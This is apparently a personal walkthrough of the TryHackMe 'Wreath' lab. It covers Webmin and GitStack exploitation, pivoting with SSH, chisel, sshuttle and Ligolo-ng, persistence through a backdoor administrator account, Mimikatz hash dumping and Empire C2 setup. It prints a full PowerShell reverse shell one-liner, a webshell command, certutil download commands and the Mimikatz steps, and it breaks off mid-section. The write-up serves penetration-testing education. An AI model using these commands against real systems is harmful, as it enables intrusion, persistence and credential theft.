# 12 - Wreath

Room Link --> [https://tryhackme.com/room/wreath](https://tryhackme.com/room/wreath)

**Wreath** is designed as a learning resource for beginners with a primary focus on:

* Pivoting
* Working with the Empire C2 (Command and Control) framework
* Simple Anti-Virus evasion techniques

The following topics will also be covered, albeit more briefly:

* Code Analysis (Python and PHP)
* Locating and modifying public exploits
* Simple webapp enumeration and exploitation
* Git Repository Analysis
* Simple Windows Post-Exploitation techniques
* CLI Firewall Administration (CentOS and Windows)
* Cross-Compilation techniques
* Coding wrapper programs
* Simple exfiltration techniques
* Formatting a pentest report

## <mark style="color:red;">Key Notes:</mark>

* There are three machines on the network
* There is at least one public facing webserver
* There is a self-hosted git server somewhere on the network
* The git server is internal, so Thomas may have pushed sensitive information into it
* There is a PC running on the network that has antivirus installed, meaning we can hazard a guess that this is likely to be Windows
* By the sounds of it this is likely to be the server variant of Windows, which might work in our favour.
* The (assumed) Windows PC cannot be accessed directly from the webserver

## <mark style="color:red;">Enumeration</mark>

### <mark style="color:green;">WebServer Enumeration</mark>

We perform an initial scan using nmap:

{% code overflow="wrap" lineNumbers="true" fullWidth="true" %}
```bash
sudo nmap 10.200.87.200 -O -p1-15000 -Pn -n -sV -T4 -vv -oN initial_scan

# results
PORT      STATE  SERVICE    REASON         VERSION
22/tcp    open   ssh        syn-ack ttl 63 OpenSSH 8.0 (protocol 2.0)
80/tcp    open   http       syn-ack ttl 63 Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1c)
443/tcp   open   ssl/http   syn-ack ttl 63 Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1c)
9090/tcp  closed zeus-admin reset ttl 63
10000/tcp open   http       syn-ack ttl 63 MiniServ 1.890 (Webmin httpd)
[...redacted...]
```
{% endcode %}

Port 10000 seems interesting.

<figure><img src=".gitbook/assets/image (88).png" alt=""><figcaption><p><a href="https://thomaswreath.thm:10000/">https://thomaswreath.thm:10000/</a></p></figcaption></figure>

We looked it up in google **"MiniServ 1.890 (Webmin httpd)"** and found it's vulnerable to RCE with CVE details --> <mark style="color:orange;">**CVE-2019-15107**</mark>

<figure><img src=".gitbook/assets/image (87).png" alt=""><figcaption><p>Vuln WebPage</p></figcaption></figure>

## <mark style="color:red;">Exploitation</mark>

Info on WebMin RCE --> [here](https://webmin.com/security/#remote-command-execution-cve-2019-15231)

We Exploited this Vulnerability using this Exploit --> [here](https://github.com/MuirlandOracle/CVE-2019-15107)

We obtained a Psuedoshell as the "root" user.

```bash
./CVE-2019-15107.py 10.200.87.200
```

<figure><img src=".gitbook/assets/image (89).png" alt=""><figcaption><p>pwned</p></figcaption></figure>

## <mark style="color:red;">Persistence</mark>

We can copy the "id\_rsa" file located in the `/root/.ssh/id_rsa` dir to our kali machine for maintaining persistence.

```bash
ssh root@10.200.87.200 -i id_rsa
```

<figure><img src=".gitbook/assets/image (90).png" alt=""><figcaption><p>SSH connection</p></figcaption></figure>

## <mark style="color:red;">Pivoting</mark>

There are two main methods encompassed in this area of pentesting:

* Tunnelling/Proxying: Creating a proxy type connection through a compromised machine in order to route all desired traffic into the targeted network. This could potentially also be _tunnelled_ inside another protocol (e.g. SSH tunnelling), which can be useful for evading a basic Intrusion Detection System (IDS) or firewall.
* Port Forwarding: Creating a connection between a local port and a single port on a target, via a compromised host.

**A proxy** is good if we want to redirect lots of different kinds of traffic into our target network -- for example, with an nmap scan, or to access multiple ports on multiple different machines.

**Port Forwarding** tends to be faster and more reliable, but only allows us to access a single port (or a small range) on a target device. Which style of pivoting is more suitable will depend entirely on the layout of the network.

### <mark style="color:green;">Pivot Enumeration</mark>

There are five possible ways to enumerate a network through a compromised host:

1. Using material found on the machine. The hosts file or ARP cache, for example.
2. Using pre-installed tools (nmap, bash, powershell).
3. Using statically compiled tools (binary files like .exe, nmap), etc.
4. Using scripting techniques.
5. Using local tools through a proxy (last resort because very SLOW).

<details>

<summary>Basic Pivot Enumeration Checklist</summary>

* `arp -a` - \[linux/windows].
* `cat /etc/hosts` - \[linux].
* `C:\Windows\System32\drivers\etc\hosts` -DNS \[windows].
* `/etc/resolv.conf` - DNS \[linux].
* `ipconfig /all` \[windows] and `nmcli dev show` \[linux].

</details>

Here is a link to some static Binary files --> [here](https://github.com/andrew-d/static-binaries)

Compiled Port Scanner for windows in C# --> [here](https://github.com/MuirlandOracle/C-Sharp-Port-Scan)

Compiled Port Scanner for windows in C++ --> [here](https://github.com/MuirlandOracle/CPP-Port-Scanner)

{% hint style="warning" %}
It's worth noting as well that you may encounter hosts which have firewalls blocking ICMP pings (Windows boxes frequently do this, for example). This is likely to be less of a problem when pivoting, however, as these firewalls (by default) often only apply to external traffic, meaning that anything sent through a compromised host on the network should be safe. It's worth keeping in mind, however.

If you suspect that a host is active but is blocking ICMP ping requests, you could also check some common ports using a tool like netcat.
{% endhint %}

Ping Sweep in Bash to discover other local networks:

{% code overflow="wrap" lineNumbers="true" %}
```bash
# bash ping sweep.
for i in {1..254}; do (ping -c 1 10.200.87.${i} | grep "bytes from" &); done
```
{% endcode %}

Port scanning in bash can be done (ideally) entirely natively:

{% code overflow="wrap" lineNumbers="true" %}
```bash
# Bear in mind that this will take a very long time, however!
for i in {1..65535}; do (echo > /dev/tcp/10.200.87.200/$i) >/dev/null 2>&1 && echo $i is open; done

# or for selected ports.
for i in {21 80 111 135 139 445 443 8080 3389}; do (echo > /dev/tcp/10.200.87.200/$i) >/dev/null 2>&1 && echo $i is open; done
```
{% endcode %}

I used a static nmap binary file and scan the internal networks from the victim 10.200.87.200 and found 3 other hosts.

<figure><img src=".gitbook/assets/image (1) (1) (1) (1) (1).png" alt=""><figcaption><p>pivot enumeration.</p></figcaption></figure>

### <mark style="color:red;">Proxychains & Foxyproxy</mark>

When creating a proxy we open up a port on our own attacking machine which is linked to the compromised server, giving us access to the target network.

**Proxychains** is a command line tool which is activated by prepending the command `proxychains` to other commands. For example, to proxy netcat  through a proxy, you could use the command:\
`proxychains nc 172.16.0.10 23`

Notice that a proxy port was not specified in the above command. This is because proxychains reads its options from a config file. The master config file is located at `/etc/proxychains.conf`. This is where proxychains will look by default; however, it's actually the last location where proxychains will look. The locations (in order) are:

1. The current directory (i.e. `./proxychains.conf`)
2. `~/.proxychains/proxychains.conf`
3. `/etc/proxychains.conf`

This makes it extremely easy to configure proxychains for a specific assignment, without altering the master file. Simply execute: `cp /etc/proxychains.conf .`, then make any changes to the config file in a copy stored in your current directory. If you're likely to move directories a lot then you could instead place it in a `.proxychains` directory under your home directory, achieving the same results. If you happen to lose or destroy the original master copy of the proxychains config, a replacement can be downloaded from [here](https://raw.githubusercontent.com/haad/proxychains/master/src/proxychains.conf).

{% hint style="danger" %}
There is one other line in the Proxychains configuration that is worth paying attention to, specifically related to the Proxy DNS settings:\
![Screenshot showing the proxy\_dns line in the Proxychains config](https://assets.tryhackme.com/additional/wreath-network/3af17f6ddafc.png)

If performing an Nmap scan through proxychains, this option can cause the scan to hang and ultimately crash. Comment out the `proxy_dns` line using a hashtag (`#`) at the start of the line before performing a scan through the proxy!\
![Proxy\_DNS line commented out with a hashtag](https://assets.tryhackme.com/additional/wreath-network/557437aec525.png)
{% endhint %}

{% hint style="warning" %}
Other things to note when scanning through proxychains:

* You can only use TCP scans -- so no UDP or SYN scans. ICMP Echo packets (Ping requests) will also not work through the proxy, so use the  `-Pn`  switch to prevent Nmap from trying it.
* It will be _extremely_ slow. Try to only use Nmap through a proxy when using the NSE (i.e. use a static binary to see where the open ports/hosts are before proxying a local copy of nmap to use the scripts library).
{% endhint %}

#### <mark style="color:green;">Foxyproxy</mark>

FoxyProxy is a browser extension which is available for [Firefox](https://addons.mozilla.org/en-GB/firefox/addon/foxyproxy-basic/) and [Chrome](https://chrome.google.com/webstore/detail/foxyproxy-basic/dookpfaalaaappcdneeahomimbllocnb). There are two versions of FoxyProxy available: Basic and Standard. Basic works perfectly for our purposes.

<figure><img src=".gitbook/assets/image (91).png" alt=""><figcaption><p>foxyproxy</p></figcaption></figure>

Once activated, all of your browser traffic will be redirected through the chosen port (so make sure the proxy is active!). Be aware that if the target network doesn't have internet access (like all TryHackMe boxes) then you will not be able to access the outside internet when the proxy is activated. Even in a real engagement, routing your general internet searches through a client's network is unwise anyway, so turning the proxy off (or using the routing features in FoxyProxy standard) for everything other than interaction with the target network is advised.

With the proxy activated, you can simply navigate to the target domain or IP in your browser and the proxy will take care of the rest!

### <mark style="color:red;">1 - SSH Tunneling & Port Forwarding</mark>

The first tool we'll be looking at is none other than the bog-standard SSH client with an OpenSSH server. Using these simple tools, it's possible to create both forward and reverse connections to make SSH "tunnels", allowing us to forward ports, and/or create proxies.

#### <mark style="color:green;">Forward Connections</mark>

There are two ways to create a forward SSH tunnel using the SSH client --> **port forwarding**, and **creating a proxy**.

* **Port forwarding** is accomplished with the `-L` switch, which creates a link to a Local port. For example, if we had SSH access to `10.200.87.200` and there's a webserver running on `10.200.87.150`, we could use this command to create a link to the server on  `10.200.87.150`:\
  `ssh -L 9051:10.200.87.150:80 root@10.200.87.200 -fN`\
  &#x20;The `-fN` combined switch does two things: `-f` backgrounds the shell immediately so that we have our own terminal back. `-N` tells SSH that it doesn't need to execute any commands -- only set up the connection.

<figure><img src=".gitbook/assets/image (1) (1) (1) (1).png" alt=""><figcaption><p>Access webpage hosted on port 80 10.200.87.150, from our kali localhost:9051</p></figcaption></figure>

* **Proxies (forward proxy)** are made using the `-D` switch, for example: `-D 1337`. This will open up port 1337 on your attacking box as a proxy to send data through into the protected network. This is useful when combined with a tool such as proxychains. An example of this command would be:\
  `ssh -D 1337 root@10.200.87.150 -fN`

<figure><img src=".gitbook/assets/image (2) (1) (1).png" alt=""><figcaption><p>Proxy connection to 10.200.87.150</p></figcaption></figure>

Now we can even scan entire 65535 port:

{% code overflow="wrap" lineNumbers="true" %}
```bash
proxychains4 nmap -sV -p- 10.200.87.150 -T4 --min-rate 20000 --open -vv
```
{% endcode %}

### <mark style="color:red;">2 - Socat</mark>

#### Reverse Shell Relay

The relay connects back to a listener started using an alias to a standard netcat listener:  `rlwrap nc -lvnp 4444`.

In this way we can set up a relay to send reverse shells through a compromised system, back to our own attacking machine. This technique can also be chained quite easily; however, in many cases it may be easier to just upload a static copy of netcat to receive your reverse shell directly on the compromised server.

<figure><img src=".gitbook/assets/image (3) (1) (1).png" alt=""><figcaption><p>Socat Reverse Shell Relay</p></figcaption></figure>

### <mark style="color:red;">3 - Chisel</mark>

[Chisel](https://github.com/jpillora/chisel) is an awesome tool which can be used to quickly and easily set up a tunnelled proxy or port forward through a compromised system, regardless of whether you have SSH access or not.

Download the Binaries --> [here](https://github.com/jpillora/chisel/releases)

Video Tutorial --> [here](https://www.youtube.com/watch?v=dIqoULXmhXg\&t=124s)

#### _Reverse SOCKS Proxy_

This connects _back_ from a compromised server to a listener waiting on our attacking machine.

`./chisel server -p 1081 --reverse` - on kali.

`./chisel server client $kaliIP:1081 R:socks` - on victim.

<figure><img src=".gitbook/assets/image (4) (1) (1).png" alt=""><figcaption><p>Reverse Socks Proxy</p></figcaption></figure>

<figure><img src=".gitbook/assets/image (5) (1) (1).png" alt=""><figcaption><p>Accessing 10.200.87.150:80</p></figcaption></figure>

My bad: its actually 127.0.0.1:8080 to access the webserver.

<figure><img src=".gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>

#### Forward Socks Proxy

Forward proxies are rarer than reverse proxies for the same reason as reverse shells are more common than bind shells; generally speaking, egress firewalls (handling outbound traffic) are less stringent than ingress firewalls (which handle inbound connections). That said, it's still well worth learning how to set up a forward proxy with chisel.

In many ways the syntax for this is simply reversed from a reverse proxy.

First, on the compromised host we would use:\
`./chisel server -p LISTEN_PORT --socks5`

On our own attacking box we would then use:\
`./chisel client TARGET_IP:LISTEN_PORT PROXY_PORT:socks`

#### _Local Port Forward_

As with SSH, a local port forward is where we connect from our own attacking machine to a chisel server listening on a compromised target.

On the compromised target we set up a chisel server:\
`./chisel server -p LISTEN_PORT`

We now connect to this from our attacking machine like so:\
`./chisel client LISTEN_IP:LISTEN_PORT LOCAL_PORT:TARGET_IP:TARGET_PORT`

For example, to connect to 172.16.0.5:8000 (the compromised host running a chisel server), forwarding our local port 2222 to 172.16.0.10:22 (our intended target), we could use:\
`./chisel client 172.16.0.5:8000 2222:172.16.0.10:22`

### <mark style="color:red;">4 - SSHuttle</mark>

`sshuttle -r username@address -N` - If this has worked, you should see the following line:\
`c : Connected to server.`

{% code overflow="wrap" lineNumbers="true" %}
```bash
# We use the "--ssh -i" to specify ssh key, "-N" to specify entire subnet automatically, "-x" to exclude the actual ssh host we are connecting to.
sshuttle -r root@10.200.87.200 --ssh-cmd "ssh -i id_rsa" -N -x 10.200.87.200
```
{% endcode %}

And we are able to access the "10.200.87.150" web server easily as shown in the image below.

<figure><img src=".gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:red;">5 - Ligolo-ng</mark>

Download from --> [here](https://github.com/nicocha30/ligolo-ng)

* **Ligolo Proxy:** is run on the attacker machine.
* **Ligolo Agent:** is run on the pivot/jump host.

#### <mark style="color:orange;">Setting up Ligolo on Kali</mark>

`sudo ip tuntap add user dking mode tun ligolo` - we use our username.

`sudo ip link set ligolo up` - we turn on the interface.

<figure><img src=".gitbook/assets/image (92).png" alt=""><figcaption></figcaption></figure>

`./proxy -selfcert` - and it starts the proxy server listening on port 11601.

#### <mark style="color:orange;">Adding an Agent</mark>

On the Victim or Pivot Machine:

`./agent -connect 10.50.88.51:11601 -ignore-cert` - connect to the kali ip and port, then since we used "selfcert" for the proxy, we just "ignore-cert" here.

And the connection should be established.

<figure><img src=".gitbook/assets/image (93).png" alt=""><figcaption></figcaption></figure>

In the Proxy menu, we can start our interaction:

{% code overflow="wrap" lineNumbers="true" %}
```bash
ligolo-ng >> help # help menu.
ligolo-ng >> session # view sessions.
ligolo-ng >> 1 # select the session number.
[Agent : root@prod-serv] >> ifconfig # for linux obvoiusly, ipconfig for windows.
[Agent : root@prod-serv] >> 
```
{% endcode %}

#### <mark style="color:orange;">For Pivoting:</mark>

We just added an Agent to the Ligolo Proxy server, now let's add our pivot.

`sudo ip route add 10.200.87.150 dev ligolo` - adding a route to the internal network we want to reach, we could also add a subnet if we like, ie; `sudo ip route add 192.168.0.1/24` .

`ip route list` - to view the routing table.

Back in our proxy tab:

{% code overflow="wrap" lineNumbers="true" %}
```bash
[Agent : root@prod-serv] >> session # confirm we are in the right session.
[Agent : root@prod-serv] >> 1 # enter correct session number.
[Agent : root@prod-serv] >> start # starts the pivot tunnel, we should be able to access the networks added in the routing table.
```
{% endcode %}

Now we can use any tool: nmap, crackmapexec, evil-winrm, enum4linux etc, to directly communicate with the internal networks.

One way to verify our Pivot is working is to use "crackmapexec" if SMB or WINRM port is open and check:

`crackmapexec smb 192.168.0.1/24` - if its able to resolve the  names of the live host in the Subnet, then it's working :)

#### <mark style="color:orange;">How to use the Ligolo Listeners to receive a reverse shell connection</mark>

After gaining access to internal networks, in this case "10.200.87.150".  Lets say we found an exploit for this machine, like an RCE or something, and we want to send the reverse shell straight to our kali box, we need to add a Listener to our Ligolo Agent.

{% code overflow="wrap" lineNumbers="true" %}
```bash
# we make sure we are in the Agent Session we want to setup a listener for (in this case, our Pivot/Jump machine).
# with this cmd, any connection (or reverse shell) from any network (internal networks) "0.0.0.0" on port "1234" should be redirected to our kali localhost on port "4444".
[Agent : root@prod-serv] >> listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:4444

# so we set a "nc" listener on kali port "4444" to catch the reverse shell, once we have our RCE.
```
{% endcode %}

<figure><img src=".gitbook/assets/image (94).png" alt=""><figcaption></figcaption></figure>

Our RCE:

Let saythis is our RCE, so normally we'd send the reverse shell to our kali ip, while our "nc" listener catches it. But here, if we do that it won't work, so  we will use the ip of our Jump/Pivot agent instead because we already setup a Ligolo Listener (0.0.0.0:1234) on the JUmp agent. This will redirect the reverse shell to our kali box on port "4444". We use the ip of our Jump Host instead of our Kali ip address.

<figure><img src=".gitbook/assets/image (95).png" alt=""><figcaption><p>RCE</p></figcaption></figure>

<figure><img src=".gitbook/assets/image (96).png" alt=""><figcaption></figcaption></figure>

And we get a shell.

#### <mark style="color:orange;">How to use Ligolo Listeners to transfer files to and from machines.</mark>

So after gaining our Reverse shell to the internal network using Ligolo Listener, we are low level user, and we want to upload say WinPEAS, LinPEAS, PowerUP etc, to get priv esc vector for priv esc or maybe we want to exfilterate data/files from the internal network to our kali machine.

We will have to setup another Listener to do File Transfers.

{% code overflow="wrap" lineNumbers="true" %}
```bash
# we are setting a listener to on our Jump host (0.0.0.0:1235) to redirect back to our kali on port "80" because we are going to be running our python server on port 80 too.
[Agent : root@prod-serv] >> listener_add --addr 0.0.0.0:1235 --to 127.0.0.1:80
```
{% endcode %}

<figure><img src=".gitbook/assets/image (97).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (98).png" alt=""><figcaption><p>we now have a dedicated listener for file transfers</p></figcaption></figure>

Our server: `python3 -m http.server 80` .

`certutil -urlcache -f http://JumpHost_IP:1235/winPEAS.exe` - so we use the ip addr of our Jump host agent here since we have a listener on "0.0.0.0:1235" that will redirect the connection to our kali machine port "80" which our server is running on.

<figure><img src=".gitbook/assets/image (99).png" alt=""><figcaption><p>successfully transferred file.</p></figcaption></figure>

## Git-Server Pivoting

So it’s an error page. There are 3 endpoints `/registration/login` `/gitstack` and `/rest`

<figure><img src=".gitbook/assets/image (1) (1).png" alt=""><figcaption><p>http://10.200.87.150/gitstack</p></figcaption></figure>

<figure><img src=".gitbook/assets/image (1) (1) (1).png" alt=""><figcaption><p>searching google for available exploit</p></figcaption></figure>

We got one from exploit-db --> [https://www.exploit-db.com/exploits/43777](https://www.exploit-db.com/exploits/43777)

We edited the "ip address" and "cmd" using nano.

<figure><img src=".gitbook/assets/image (2) (1).png" alt=""><figcaption><p>modifying exploit</p></figcaption></figure>

`python2 43777.py` - running exploit.

<figure><img src=".gitbook/assets/image (3) (1).png" alt=""><figcaption><p>we got "nt authority"</p></figcaption></figure>

We can also check the uploaded "exploit.php" using curl

`curl -X POST http://10.200.87.150/web/exploit.php -d "a=whoami"` -

<figure><img src=".gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>

From here we want to obtain a full reverse shell. We have two options for this:

1. We could change the command in the exploit and re-run the code
2. We could use our knowledge of the script to leverage the same webshell to execute more commands for us, without performing the full exploit twice

Option number two is a lot quieter than option number 1, so let's use that.

Before we go for a reverse shell, we need to establish whether or not this target is allowed to connect to the outside world.

<figure><img src=".gitbook/assets/image (5) (1).png" alt=""><figcaption><p>we can't ping outside</p></figcaption></figure>

But we see we are able to ping our Jump host.

<figure><img src=".gitbook/assets/image (6).png" alt=""><figcaption><p>we can ping 10.200.87.200</p></figcaption></figure>

Ok, since we can ping 10.200.87.200, and we also have a stable shell on 10.200.87.200, there are 2 options to get a reverse shell for 10.200.87.150.

* we could upload a static copy of [netcat](https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86\_64/ncat) and just catch the shell here.
* We could set up a relay on .200 to forward a shell back to a listener using "socat" or "ligolo-ng".

{% hint style="warning" %}
Before we can do this, however, we need to take one other thing into account. CentOS uses an always-on wrapper around the IPTables firewall called "firewalld". By default, this firewall is extremely restrictive, only allowing access to SSH and anything else the sysadmin has specified. Before we can start capturing (or relaying) shells, we will need to open our desired port in the firewall. This can be done with the following command:

`firewall-cmd --zone=public --add-port 20000/tcp`&#x20;
{% endhint %}

<figure><img src=".gitbook/assets/image (5).png" alt=""><figcaption><p>added a firewall rule to allow imbound traffic from tcp port 20000</p></figcaption></figure>

{% hint style="success" %}
We used nishang powershell reverse shell oneliner below.



powershell.exe -c "$client = New-Object System.Net.Sockets.TCPClient('10.200.87.200',20000);$stream = $client.GetStream();\[byte\[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = (\[text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
{% endhint %}

I used Ligolo-ng to get the reverse shell :)

<figure><img src=".gitbook/assets/image (100).png" alt=""><figcaption><p>got reverse shell on number 3.</p></figcaption></figure>

## Git Server Stabilisation & Post Exploitation

Since ports "3389" and "5985" are open on 10.200.87.150 for the purpose of this lab we will be establishing persistence by creating a new user, adding the user to the RDP group. We could also authenticate with new user account via WinRM using Evil-WinRM but evil-winrm won't allow for execution of high privilege task even though the user is in the local administrator group, hence, we will use RDP session instead.

{% code overflow="wrap" lineNumbers="true" %}
```bash
net user dking Password123!
net localgroup Administrators dking /add
net localgroup "Remote Management Users" dking /add

# accessing new account via Evil-WinRM
evil-winrm -i 10.200.87.150 -u dking -p 'Password123!'
```
{% endcode %}

<figure><img src=".gitbook/assets/image (101).png" alt=""><figcaption><p>successfully added a new user, and can access via evil-winRM</p></figcaption></figure>

#### Via RDP using \[xfreerdp] utility

{% code overflow="wrap" lineNumbers="true" %}
```bash
xfreerdp /v:10.200.87.150 /u:dking /p:Password123! +clipboard /dynamic-resolution /drive:/usr/share/windows-resources,share

# since i specified "/usr/share/windows-resources" as the location to create as a shared folder and used "share" as the shared folder name, we can access this share using:
\\tsclient\share

# with this share we can easily execute files from our kali, without transfering them to the victim for execution.
```
{% endcode %}

<figure><img src=".gitbook/assets/image (102).png" alt=""><figcaption><p>success</p></figcaption></figure>

Its time to dump the Hashes using Mimikatz:

Open a privileged cmd prompt session, then type: `\tsclient\share\mimikatz\x64\mimikatz.exe` -&#x20;

We execute the following cmds in order:

{% code overflow="wrap" lineNumbers="true" %}
```bash
privilege::debug
token::elevate
lsadump::sam # dumps all hashes.
```
{% endcode %}

<figure><img src=".gitbook/assets/image (103).png" alt=""><figcaption><p>:)</p></figcaption></figure>

Now we have the hashes we could either crack them or do a "pass-the-hash" attack.

We are more interested in the administrator accound hash.

## Powershell Empire (C2)

The C2 Matrix --> [https://www.thec2matrix.com/](https://www.thec2matrix.com/)

```bash
sudo powershell-empire server # start the server.
sudo powershell-empire client # start the client.

# or use the GUI (Starkiller)
# username -> empireadmin and password -> password123
http://localhost:1337/index.html
```

{% hint style="warning" %}
With the server instance hosted locally this should connect automatically by default. If the Empire server was on a different machine then you would need to either change the connection information in the `/usr/share/powershell-empire/empire/client/config.yaml` file, or connect manually from the Empire CLI Client using `connect HOSTNAME --username=USERNAME --password=PASSWORD`
{% endhint %}

* Listeners are fairly self-explanatory. They listen for a connection and facilitate further exploitation
* Stagers are essentially payloads generated by Empire to create a robust reverse shell in conjunction with a listener. They are the delivery mechanism for agents
* Agents are the equivalent of a Metasploit "Session". They are connections to compromised targets, and allow an attacker to further interact with the system
* Modules are used to in conjunction with agents to perform further exploitation. For example, they can work through an existing agent to dump the password hashes from the server

### Empire Listeners

{% code overflow="wrap" lineNumbers="true" %}
```bash
# listener setup
uselistener http # use an http listener.
set name clihttp
set Host 10.50.88.51
set Port 8000
options # used to view updated configs.
execute # start listener.
back # go back, or main menu.
kill <listener_name> # kill a listener.

# the process on the GUI is also intuituive (click the create button in the Listeners session).
```
{% endcode %}

<figure><img src=".gitbook/assets/image (104).png" alt=""><figcaption><p>listeners</p></figcaption></figure>

### Empire Stagers

Stagers are Empire's payloads. They are used to connect back to waiting listeners, creating an agent when executed.

{% code overflow="wrap" lineNumbers="true" %}
```bash
# from the main empire prompt:
usestager # list stagers.
usestager multi/bash # or multi/launcher when in doubt.
set listener clihttp # we could set other options as required also.
execute # creating the stager in our /tmp directory.
```
{% endcode %}

<figure><img src=".gitbook/assets/image (105).png" alt=""><figcaption><p>stager</p></figcaption></figure>

### Empire Agents

Now that we've started a listener and created a stager, it's time to put them together to get an agent!.

<figure><img src=".gitbook/assets/image (106).png" alt=""><figcaption><p>we just copy and paste the red section into our Jump host ssh session.</p></figcaption></figure>

We get a new Agent checked in.

<figure><img src=".gitbook/assets/image (107).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" lineNumbers="true" %}
```bash
interact <agent_name> # to interact with the agent.
help # display the help menu.
rename <agent_name> <new_name> # to rename the agent.
shell whoami # run shell cmds.
kill <agent_name> # to kil the agent.
```
{% endcode %}

### Empire Hop Listeners

As mentioned previously, Empire agents can't be proxied with a socat relay or any equivalent redirects; but there must be a way to get an agent back from a target with no outbound access, right? The answer is yes. We use something called a Hop Listener.

Hop Listeners create what looks like a regular listener in our list of listeners (like the http listener we used before); however, rather than opening a port to receive a connection, hop listeners create files to be copied across to the compromised "jump" server and served from there. These files contain instructions to connect back to a normal (usually HTTP) listener on our attacking machine. As such, the hop listener in the listeners menu can be thought of as more of a placeholder -- a reference to be used when generating stagers.

{% code overflow="wrap" lineNumbers="true" %}
```bash
uselistener http_hop # select the hop listener.
set RedirectListener clihttp
set Host 10.200.87.200
set Port 47000
execute # to start the listener.
```
{% endcode %}

Specifically we need:-

* A RedirectListener -- this is a regular listener to forward any received agents to. Think of the hop listener as being something like a relay on the compromised server; we still need to catch it with something! You could use the listener you set up earlier for this, or create an entirely new HTTP listener using the same steps we used earlier. Make sure that this matches up with the name of an already active listener though!
* A Host -- the IP of the compromised webserver (`.200`).
* A Port -- this is the port which will be used for the webserver hosting our hop files. Pick a random port here (above 15000), but remember it!

\[......To be continued......]



## Personal PC Enumeration

We first need to scope out the final target! We know from the briefing that this target is likely to be the other Windows machine on the network. By process of elimination we can tell that this is Thomas' PC which he told us has antivirus software installed. \
Since we have access to powershell, we can use the "Invoke-Portscan.ps1" script.

We use evil-winRM and the Adminstrator hash we already have, upload the file to the .150 machine.

`Invoke-Portscan -Hosts 10.200.87.100 -TopPorts 50` - we can also use the `Get-Help Invoke-Portscan` - to view the help menu.

<figure><img src=".gitbook/assets/image (108).png" alt=""><figcaption></figcaption></figure>

## Personal PC Pivoting

We have two immediate options for this: Chisel, and Plink.

First of all we upload chisel.exe binary to the Git Server (.150) through Evil-WinRM upload feature.

Secondly, we have to open up one port in the git server machine by adding a firewall rule so that, firewall doesn’t block our connection.

{% code overflow="wrap" lineNumbers="true" %}
```powershell
# dir=in which means the direction of packets will be coming in to this machine and action=allow which says to allow the packets. Finally localport=30000 opens up port 30000 for this
netsh advfirewall firewall add rule name="chisel_dking" dir=in action=allow protocol=tcp localport=30000
```
{% endcode %}

#### Method 1 - Port Forward

`.\chisel_dking server -p 30000` - on the Git server.

`./chisel client 10.200.87.150:30000 9020:10.200.87.100:80` - on our kali (this forward all the traffic from our `kali localhost:9020` to the Target Machine (personal pc) `10.200.57.100:80` using the (Git Server) `10.200.57.150:30000` in the middle).

<figure><img src=".gitbook/assets/image (109).png" alt=""><figcaption></figcaption></figure>

Now we can access the Prsonal PC port 80 easily by going to `127.0.0.1:9020` - from our browser.

<figure><img src=".gitbook/assets/image (110).png" alt=""><figcaption><p>success</p></figcaption></figure>

Another way to do this with chisel is:

#### Method 2 - Forward proxy

<figure><img src=".gitbook/assets/image (111).png" alt=""><figcaption></figcaption></figure>

This will establish the connection to the chisel server. The communication is done via the `9090` socks proxy. But for this we have to use Foxyproxy to access the site:

<figure><img src=".gitbook/assets/image (112).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (113).png" alt=""><figcaption></figcaption></figure>

Ok, so we have access to the Personal PC web server now.

## The Wonders of Git

### Git Files <a href="#git-files" id="git-files"></a>

The website itself appears to be an exact copy of the website running on the `10.200.85.200` server. To discover any differences, we would have to do some fuzzing which is very tedious through two proxies.

So we need another idea. The hint on the Wreath task description summarizes the attack vector pretty well:

“We know from the brief that Thomas has been using git server to version control his projects – just because the version on the webserver isn’t up to date, doesn’t mean that he hasn’t been committing to the repo more regularly! In other words, rather than fuzzing the server, we might be able to just download the source code for the site and review it locally. Ideally we could just clone the repo directly from the server. This would likely require credentials, which we would need to find. Alternatively, given we already have local admin access to the git server, we could just download the repository from the hard disk and re-assemble it locally which does not require any (further) authentication.” (https://tryhackme.com/room/wreath)

So let’s do that. We use the `evil-rm` login (pass the hash) and search for git files.

We navigate to the `C:\` dir and found a "GitStack" dir.

In the directory `C:\GitStack\repositories` we find a file called `Website.git`.  Let's download and analyze it locally on our kali machine. (Note: for the download, the absolute path has to be specified).

`download C:\GitStack\repositories\website.git`&#x20;

Once downloaded, we rename it to: `mv website.git .git` then run "git log" on it, to see all previous commits.

<figure><img src=".gitbook/assets/image (115).png" alt=""><figcaption><p>extract everything to the "website_extracted" folder.</p></figcaption></figure>

{% hint style="warning" %}
Git repositories always contain a special directory called .git which contains all of the meta-information for the repository. This directory can be used to fully recreate a readable copy of the repository, including things like version control and branches. If the repository is local then this directory would be a part of the full repository — the rest of which would be the items of the repository in a human-readable format; however, as the .git directory is enough to recreate the repository in its entirety, the server doesn’t need to store the easily readable versions of the files. This means that what we’ve downloaded isn’t actually the full repository, so much as the building blocks we can use to recreate the repo.

To analyze this .git directory we use a tool named "GitTools" which is available on the following link:

> git clone [https://github.com/internetwache/GitTools](https://github.com/internetwache/GitTools)

We use it to extract information for the downloaded git directory.
{% endhint %}

After running "GitTools" on the "website.git" renamed to ".git" folder, it extracted 3 folders which corresponds to the 3 commits we saw when we ran "git log" earlier.

It's up to us to piece together the order of the commits. Fortunately there are only three commits in this repository, and each commit comes with a `commit-meta.txt` file which we can use to get an idea of the order.

We could just cat each of these files out separately, but we may as well do it the fancy way with a bash one-liner:

We could just cat each of these files out separately, but we may as well do it the fancy way with a bash one-liner:

{% code overflow="wrap" lineNumbers="true" %}
```bash
